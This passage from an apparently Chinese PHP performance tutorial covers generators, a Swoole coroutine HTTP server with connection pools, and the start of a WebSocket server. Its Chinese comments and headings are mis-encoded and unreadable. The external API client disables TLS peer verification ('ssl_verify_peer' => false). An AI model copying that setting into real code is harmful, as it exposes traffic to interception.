 * åƒåœ¾å›æ”¶ä¼˜åŒ–
 */</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MemoryEfficientProcessor</span>
</span>{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$buffer</span> = [];
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">processLargeDataset</span>(<span class="hljs-params"><span class="hljs-keyword">iterable</span> <span class="hljs-variable">$dataset</span></span>): <span class="hljs-title">Generator</span>
    </span>{
        <span class="hljs-comment">// ä½¿ç”¨ç”Ÿæˆå™¨é¿å…å†…å­˜æº¢å‡º</span>
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dataset</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) {
            <span class="hljs-keyword">yield</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">processItem</span>(<span class="hljs-variable">$item</span>);
            
            <span class="hljs-comment">// å®šæœŸè§¦å‘åƒåœ¾å›æ”¶</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$this</span>-&gt;buffer) &gt; <span class="hljs-number">1000</span>) {
                <span class="hljs-variable language_">$this</span>-&gt;buffer = [];
                <span class="hljs-title function_ invoke__">gc_collect_cycles</span>();
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">processItem</span>(<span class="hljs-params"><span class="hljs-keyword">mixed</span> <span class="hljs-variable">$item</span></span>): <span class="hljs-title">mixed</span>
    </span>{
        <span class="hljs-comment">// å¤„ç†é€»è¾‘</span>
        <span class="hljs-variable">$processed</span> = <span class="hljs-title function_ invoke__">do_processing</span>(<span class="hljs-variable">$item</span>);
        <span class="hljs-variable language_">$this</span>-&gt;buffer[] = <span class="hljs-variable">$processed</span>;
        
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$processed</span>;
    }
}
</code></pre>
<h3 data-id="heading-4">äºŒã€Swoole å¼‚æ­¥ç¼–ç¨‹ä¸åç¨‹å®æˆ˜</h3>
<h4 data-id="heading-5">2.1 åç¨‹ HTTP æœåŠ¡å™¨ä¸è¿æ¥æ± </h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">ModernPHP</span>\<span class="hljs-title class_">Swoole</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">Swoole</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Request</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Swoole</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Response</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Swoole</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Server</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Swoole</span>\<span class="hljs-title">Coroutine</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Swoole</span>\<span class="hljs-title">Coroutine</span>\<span class="hljs-title">Channel</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Swoole</span>\<span class="hljs-title">Coroutine</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Client</span>;

<span class="hljs-comment">/**
 * é«˜æ€§èƒ½ Swoole HTTP æœåŠ¡å™¨
 */</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HighPerformanceHttpServer</span>
</span>{
    <span class="hljs-keyword">private</span> Server <span class="hljs-variable">$server</span>;
    <span class="hljs-keyword">private</span> ConnectionPool <span class="hljs-variable">$mysqlPool</span>;
    <span class="hljs-keyword">private</span> ConnectionPool <span class="hljs-variable">$redisPool</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">string</span> <span class="hljs-variable">$host</span> = <span class="hljs-string">'0.0.0.0'</span>,
        <span class="hljs-keyword">int</span> <span class="hljs-variable">$port</span> = <span class="hljs-number">9501</span>
    </span>) </span>{
        <span class="hljs-variable language_">$this</span>-&gt;server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Server</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span>);
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">initializePools</span>();
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">configureServer</span>();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializePools</span>(<span class="hljs-params"/>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-comment">// MySQL è¿æ¥æ± </span>
        <span class="hljs-variable language_">$this</span>-&gt;mysqlPool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionPool</span>(
            <span class="hljs-function"><span class="hljs-keyword">fn</span>(<span class="hljs-params"/>) =&gt;</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">createMysqlConnection</span>(),
            <span class="hljs-number">100</span>, <span class="hljs-comment">// æœ€å¤§è¿æ¥æ•°</span>
            <span class="hljs-number">10</span>   <span class="hljs-comment">// æœ€å°è¿æ¥æ•°</span>
        );
        
        <span class="hljs-comment">// Redis è¿æ¥æ± </span>
        <span class="hljs-variable language_">$this</span>-&gt;redisPool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionPool</span>(
            <span class="hljs-function"><span class="hljs-keyword">fn</span>(<span class="hljs-params"/>) =&gt;</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">createRedisConnection</span>(),
            <span class="hljs-number">200</span>, <span class="hljs-comment">// æœ€å¤§è¿æ¥æ•°</span>
            <span class="hljs-number">20</span>   <span class="hljs-comment">// æœ€å°è¿æ¥æ•°</span>
        );
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">configureServer</span>(<span class="hljs-params"/>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;server-&gt;<span class="hljs-title function_ invoke__">set</span>([
            <span class="hljs-string">'worker_num'</span> =&gt; <span class="hljs-title function_ invoke__">swoole_cpu_num</span>() * <span class="hljs-number">2</span>,
            <span class="hljs-string">'task_worker_num'</span> =&gt; <span class="hljs-title function_ invoke__">swoole_cpu_num</span>(),
            <span class="hljs-string">'enable_static_handler'</span> =&gt; <span class="hljs-literal">true</span>,
            <span class="hljs-string">'document_root'</span> =&gt; <span class="hljs-string">'/path/to/static'</span>,
            <span class="hljs-string">'http_compression'</span> =&gt; <span class="hljs-literal">true</span>,
            <span class="hljs-string">'http_compression_level'</span> =&gt; <span class="hljs-number">6</span>,
            <span class="hljs-string">'package_max_length'</span> =&gt; <span class="hljs-number">50</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>, // <span class="hljs-number">50</span>MB
            <span class="hljs-string">'buffer_output_size'</span> =&gt; <span class="hljs-number">32</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>, // <span class="hljs-number">32</span>MB
            
            // åç¨‹é…ç½®
            <span class="hljs-string">'enable_coroutine'</span> =&gt; <span class="hljs-literal">true</span>,
            <span class="hljs-string">'max_coroutine'</span> =&gt; <span class="hljs-number">100000</span>,
            <span class="hljs-string">'socket_buffer_size'</span> =&gt; <span class="hljs-number">128</span> * <span class="hljs-number">1024</span>, // <span class="hljs-number">128</span>KB
        ]);
        
        <span class="hljs-comment">// æ³¨å†Œäº‹ä»¶å›è°ƒ</span>
        <span class="hljs-variable language_">$this</span>-&gt;server-&gt;<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">'start'</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">'onStart'</span>]);
        <span class="hljs-variable language_">$this</span>-&gt;server-&gt;<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">'request'</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">'onRequest'</span>]);
        <span class="hljs-variable language_">$this</span>-&gt;server-&gt;<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">'task'</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">'onTask'</span>]);
        <span class="hljs-variable language_">$this</span>-&gt;server-&gt;<span class="hljs-title function_ invoke__">on</span>(<span class="hljs-string">'finish'</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">'onFinish'</span>]);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onStart</span>(<span class="hljs-params">Server <span class="hljs-variable">$server</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Swoole HTTP server is started at http://<span class="hljs-subst">{$server-&gt;host}</span>:<span class="hljs-subst">{$server-&gt;port}</span>\n"</span>;
    }
    
    <span class="hljs-comment">/**
     * å¼‚æ­¥éé˜»å¡è¯·æ±‚å¤„ç†
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onRequest</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span>, Response <span class="hljs-variable">$response</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-comment">// è®¾ç½®å“åº”å¤´</span>
        <span class="hljs-variable">$response</span>-&gt;<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'application/json'</span>);
        <span class="hljs-variable">$response</span>-&gt;<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Server'</span>, <span class="hljs-string">'Swoole/'</span> . SWOOLE_VERSION);
        
        <span class="hljs-comment">// å¼‚æ­¥å¹¶è¡Œå¤„ç†å¤šä¸ªä»»åŠ¡</span>
        <span class="hljs-title class_">Coroutine</span>::<span class="hljs-title function_ invoke__">create</span>(function () <span class="hljs-keyword">use</span> ($<span class="hljs-title">request</span>, $<span class="hljs-title">response</span>) {
            <span class="hljs-title">try</span> {
                // å¹¶è¡Œæ‰§è¡Œå¤šä¸ªå¼‚æ­¥æ“ä½œ
                $<span class="hljs-title">results</span> = $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">parallelProcessing</span>($<span class="hljs-title">request</span>);
                
                <span class="hljs-variable">$response</span>-&gt;<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">json_encode</span>([
                    <span class="hljs-string">'success'</span> =&gt; <span class="hljs-literal">true</span>,
                    <span class="hljs-string">'data'</span> =&gt; <span class="hljs-variable">$results</span>,
                    <span class="hljs-string">'timestamp'</span> =&gt; <span class="hljs-title function_ invoke__">time</span>()
                ]));
            } <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>) {
                <span class="hljs-variable">$response</span>-&gt;<span class="hljs-title function_ invoke__">status</span>(<span class="hljs-number">500</span>);
                <span class="hljs-variable">$response</span>-&gt;<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">json_encode</span>([
                    <span class="hljs-string">'success'</span> =&gt; <span class="hljs-literal">false</span>,
                    <span class="hljs-string">'error'</span> =&gt; <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>(),
                    <span class="hljs-string">'trace_id'</span> =&gt; <span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-string">'err_'</span>, <span class="hljs-literal">true</span>)
                ]));
            }
        });
    }
    
    <span class="hljs-comment">/**
     * åç¨‹å¹¶è¡Œå¤„ç†ç¤ºä¾‹
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parallelProcessing</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-variable">$channel</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Channel</span>(<span class="hljs-number">3</span>);
        
        <span class="hljs-comment">// å¹¶è¡Œæ‰§è¡Œä¸‰ä¸ªå¼‚æ­¥ä»»åŠ¡</span>
        <span class="hljs-title class_">Coroutine</span>::<span class="hljs-title function_ invoke__">create</span>(function () <span class="hljs-keyword">use</span> ($<span class="hljs-title">channel</span>) {
            $<span class="hljs-title">user</span> = $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">fetchUserFromDatabase</span>();
            <span class="hljs-variable">$channel</span>-&gt;<span class="hljs-title function_ invoke__">push</span>([<span class="hljs-string">'type'</span> =&gt; <span class="hljs-string">'user'</span>, <span class="hljs-string">'data'</span> =&gt; <span class="hljs-variable">$user</span>]);
        });
        
        <span class="hljs-title class_">Coroutine</span>::<span class="hljs-title function_ invoke__">create</span>(function () <span class="hljs-keyword">use</span> ($<span class="hljs-title">channel</span>, $<span class="hljs-title">request</span>) {
            $<span class="hljs-title">session</span> = $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">validateSession</span>($<span class="hljs-title">request</span>);
            <span class="hljs-variable">$channel</span>-&gt;<span class="hljs-title function_ invoke__">push</span>([<span class="hljs-string">'type'</span> =&gt; <span class="hljs-string">'session'</span>, <span class="hljs-string">'data'</span> =&gt; <span class="hljs-variable">$session</span>]);
        });
        
        <span class="hljs-title class_">Coroutine</span>::<span class="hljs-title function_ invoke__">create</span>(function () <span class="hljs-keyword">use</span> ($<span class="hljs-title">channel</span>, $<span class="hljs-title">request</span>) {
            $<span class="hljs-title">external</span> = $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">callExternalApi</span>($<span class="hljs-title">request</span>);
            <span class="hljs-variable">$channel</span>-&gt;<span class="hljs-title function_ invoke__">push</span>([<span class="hljs-string">'type'</span> =&gt; <span class="hljs-string">'external'</span>, <span class="hljs-string">'data'</span> =&gt; <span class="hljs-variable">$external</span>]);
        });
        
        <span class="hljs-comment">// æ”¶é›†æ‰€æœ‰ç»“æœ</span>
        <span class="hljs-variable">$results</span> = [];
        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">3</span>; <span class="hljs-variable">$i</span>++) {
            <span class="hljs-variable">$results</span>[] = <span class="hljs-variable">$channel</span>-&gt;<span class="hljs-title function_ invoke__">pop</span>(<span class="hljs-number">5.0</span>); <span class="hljs-comment">// 5ç§’è¶…æ—¶</span>
        }
        
        <span class="hljs-variable">$channel</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
        
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$results</span>;
    }
    
    <span class="hljs-comment">/**
     * ä½¿ç”¨è¿æ¥æ± æŸ¥è¯¢æ•°æ®åº“
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fetchUserFromDatabase</span>(<span class="hljs-params"/>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-comment">// ä»è¿æ¥æ± è·å–è¿æ¥</span>
        <span class="hljs-variable">$connection</span> = <span class="hljs-variable language_">$this</span>-&gt;mysqlPool-&gt;<span class="hljs-title function_ invoke__">get</span>();
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ‰§è¡ŒæŸ¥è¯¢</span>
            <span class="hljs-variable">$result</span> = <span class="hljs-variable">$connection</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(
                <span class="hljs-string">'SELECT * FROM users WHERE id = ? LIMIT 1'</span>,
                [<span class="hljs-title function_ invoke__">random_int</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>)]
            );
            
            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetchAssoc</span>();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// ç¡®ä¿è¿æ¥å½’è¿˜åˆ°è¿æ¥æ± </span>
            <span class="hljs-variable language_">$this</span>-&gt;mysqlPool-&gt;<span class="hljs-title function_ invoke__">put</span>(<span class="hljs-variable">$connection</span>);
        }
    }
    
    <span class="hljs-comment">/**
     * è°ƒç”¨å¤–éƒ¨ APIï¼ˆå¼‚æ­¥ HTTP å®¢æˆ·ç«¯ï¼‰
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">callExternalApi</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>(<span class="hljs-string">'api.external.com'</span>, <span class="hljs-number">443</span>, <span class="hljs-literal">true</span>);
        <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">set</span>([
            <span class="hljs-string">'timeout'</span> =&gt; <span class="hljs-number">3.0</span>,
            <span class="hljs-string">'ssl_verify_peer'</span> =&gt; <span class="hljs-literal">false</span>,
        ]);
        
        <span class="hljs-comment">// å¼‚æ­¥è¯·æ±‚</span>
        <span class="hljs-variable">$client</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">'/v1/data'</span>);
        
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$client</span>-&gt;statusCode === <span class="hljs-number">200</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$client</span>-&gt;body, <span class="hljs-literal">true</span>);
        }
        
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">'External API call failed'</span>);
    }
    
    <span class="hljs-comment">/**
     * å¼‚æ­¥ä»»åŠ¡å¤„ç†
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">onTask</span>(<span class="hljs-params">Server <span class="hljs-variable">$server</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$taskId</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$workerId</span>, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$data</span></span>): <span class="hljs-title">mixed</span>
    </span>{
        <span class="hljs-comment">// å¤„ç†è€—æ—¶ä»»åŠ¡</span>
        <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$data</span>[<span class="hljs-string">'type'</span>]) {
            <span class="hljs-keyword">case</span> <span class="hljs-string">'email'</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">sendEmail</span>(<span class="hljs-variable">$data</span>);
            <span class="hljs-keyword">case</span> <span class="hljs-string">'report'</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">generateReport</span>(<span class="hljs-variable">$data</span>);
            <span class="hljs-keyword">case</span> <span class="hljs-string">'backup'</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">backupData</span>(<span class="hljs-variable">$data</span>);
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
    }
    
    <span class="hljs-comment">/**
     * å‘é€é‚®ä»¶ï¼ˆå¼‚æ­¥ä»»åŠ¡ï¼‰
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendEmail</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>): <span class="hljs-title">bool</span>
    </span>{
        <span class="hljs-comment">// æ¨¡æ‹Ÿé‚®ä»¶å‘é€</span>
        <span class="hljs-title class_">Coroutine</span>::<span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">0.5</span>);
        
        <span class="hljs-comment">// å®é™…å‘é€é€»è¾‘</span>
        <span class="hljs-comment">// mail($data['to'], $data['subject'], $data['body']);</span>
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">start</span>(<span class="hljs-params"/>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;server-&gt;<span class="hljs-title function_ invoke__">start</span>();
    }
}

<span class="hljs-comment">/**
 * é€šç”¨è¿æ¥æ± å®ç°
 */</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConnectionPool</span>
</span>{
    <span class="hljs-keyword">private</span> Channel <span class="hljs-variable">$pool</span>;
    <span class="hljs-keyword">private</span> \<span class="hljs-built_in">Closure</span> <span class="hljs-variable">$constructor</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$size</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">\<span class="hljs-built_in">Closure</span> <span class="hljs-variable">$constructor</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$maxSize</span> = <span class="hljs-number">100</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$minSize</span> = <span class="hljs-number">10</span></span>)
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;constructor = <span class="hljs-variable">$constructor</span>;
        <span class="hljs-variable language_">$this</span>-&gt;pool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Channel</span>(<span class="hljs-variable">$maxSize</span>);
        <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-number">0</span>;
        
        <span class="hljs-comment">// åˆå§‹åŒ–æœ€å°è¿æ¥æ•°</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$minSize</span>; <span class="hljs-variable">$i</span>++) {
            <span class="hljs-variable language_">$this</span>-&gt;pool-&gt;<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">createConnection</span>());
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"/>): <span class="hljs-title">mixed</span>
    </span>{
        <span class="hljs-comment">// ä»æ± ä¸­è·å–è¿æ¥</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;pool-&gt;<span class="hljs-title function_ invoke__">isEmpty</span>() &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;size &lt; <span class="hljs-variable language_">$this</span>-&gt;pool-&gt;capacity) {
            <span class="hljs-comment">// åˆ›å»ºæ–°è¿æ¥</span>
            <span class="hljs-variable language_">$this</span>-&gt;size++;
            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;constructor)();
        }
        
        <span class="hljs-comment">// ç­‰å¾…å¯ç”¨è¿æ¥ï¼ˆè¶…æ—¶ 3 ç§’ï¼‰</span>
        <span class="hljs-variable">$connection</span> = <span class="hljs-variable language_">$this</span>-&gt;pool-&gt;<span class="hljs-title function_ invoke__">pop</span>(<span class="hljs-number">3.0</span>);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$connection</span> === <span class="hljs-literal">false</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">'Connection pool timeout'</span>);
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$connection</span>;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">put</span>(<span class="hljs-params"><span class="hljs-keyword">mixed</span> <span class="hljs-variable">$connection</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-comment">// å½’è¿˜è¿æ¥åˆ°æ± ä¸­</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;pool-&gt;<span class="hljs-title function_ invoke__">isFull</span>()) {
            <span class="hljs-comment">// è¿æ¥æ± å·²æ»¡ï¼Œå…³é—­è¿æ¥</span>
            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">closeConnection</span>(<span class="hljs-variable">$connection</span>);
            <span class="hljs-variable language_">$this</span>-&gt;size--;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable language_">$this</span>-&gt;pool-&gt;<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-variable">$connection</span>);
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createConnection</span>(<span class="hljs-params"/>): <span class="hljs-title">mixed</span>
    </span>{
        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;constructor)();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">closeConnection</span>(<span class="hljs-params"><span class="hljs-keyword">mixed</span> <span class="hljs-variable">$connection</span></span>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-comment">// å…³é—­è¿æ¥é€»è¾‘</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$connection</span>, <span class="hljs-string">'close'</span>)) {
            <span class="hljs-variable">$connection</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
        }
    }
}
</code></pre>
<h4 data-id="heading-6">2.2 WebSocket å®æ—¶é€šä¿¡ä¸ RPC æœåŠ¡</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-keyword">namespace</span> <span class="hljs-title class_">ModernPHP</span>\<span class="hljs-title class_">Swoole</span>\<span class="hljs-title class_">WebSocket</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">Swoole</span>\<span class="hljs-title">WebSocket</span>\<span class="hljs-title">Server</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Swoole</span>\<span class="hljs-title">WebSocket</span>\<span class="hljs-title">Frame</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Swoole</span>\<span class="hljs-title">Coroutine</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Swoole</span>\<span class="hljs-title">Coroutine</span>\<span class="hljs-title">Channel</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Swoole</span>\<span class="hljs-title">Atomic</span>;
<span class="hljs-keyword">use</span> <span class="hljs-title">Swoole</span>\<span class="hljs-title">Table</span>;

<span class="hljs-comment">/**
 * é«˜æ€§èƒ½ WebSocket æœåŠ¡å™¨
 */</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RealTimeWebSocketServer</span>
</span>{
    <span class="hljs-keyword">private</span> Server <span class="hljs-variable">$server</span>;
    <span class="hljs-keyword">private</span> Table <span class="hljs-variable">$connectionTable</span>;
    <span class="hljs-keyword">private</span> Atomic <span class="hljs-variable">$connectionCounter</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$roomSubscriptions</span> = [];
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$host</span> = <span class="hljs-string">'0.0.0.0'</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$port</span> = <span class="hljs-number">9502</span></span>)
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Server</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span>);
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">initializeTables</span>();
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">configureServer</span>();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">initializeTables</span>(<span class="hljs-params"/>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-comment">// ç”¨äºå­˜å‚¨è¿æ¥ä¿¡æ¯çš„å…±äº«å†…å­˜è¡¨</span>
        <span class="hljs-variable language_">$this</span>-&gt;connectionTable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Table</span>(<span class="hljs-number">1024</span>);
        <span class="hljs-variable language_">$this</span>-&gt;connectionTable-&gt;<span class="hljs-title function_ invoke__">column</span>(<span class="hljs-string">'fd'</span>, <span class="hljs-title class_">Table</span>::<span class="hljs-variable constant_">TYPE_INT</span>);
        <span class="hljs-variable language_">$this</span>-&gt;connectionTable-&gt;<span class="hljs-title function_ invoke__">column</span>(<span class="hljs-string">'user_id'</span>, <span class="hljs-title class_">Table</span>::<span class="hljs-variable constant_">TYPE_INT</span>);
        <span class="hljs-variable language_">$this</span>-&gt;connectionTable-&gt;<span class="hljs-title function_ invoke__">column</span>(<span class="hljs-string">'connected_at'</span>, <span class="hljs-title class_">Table</span>::<span class="hljs-variable constant_">TYPE_INT</span>);
        <span class="hljs-variable language_">$this</span>-&gt;connectionTable-&gt;<span class="hljs-title function_ invoke__">column</span>(<span class="hljs-string">'last_activity'</span>, <span class="hljs-title class_">Table</span>::<span class="hljs-variable constant_">TYPE_INT</span>);
